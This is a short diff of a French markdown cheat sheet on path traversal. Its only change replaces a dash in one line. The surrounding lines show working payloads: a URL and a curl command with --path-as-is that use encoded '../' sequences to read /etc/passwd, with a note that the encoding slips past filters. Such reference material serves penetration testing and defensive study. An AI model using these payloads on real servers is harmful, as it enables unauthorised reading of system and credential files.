@@ -46,7 +46,7 @@ http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../etc/passwd
 
 #### Path traversal URL-encodé (curl)
 
-> `.%2e` = `..` encodé — contourne les filtres qui bloquent `../` en clair.
+> `.%2e` = `..` encodé -  contourne les filtres qui bloquent `../` en clair.
 
 ```bash
 curl --path-as-is "http://192.168.127.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
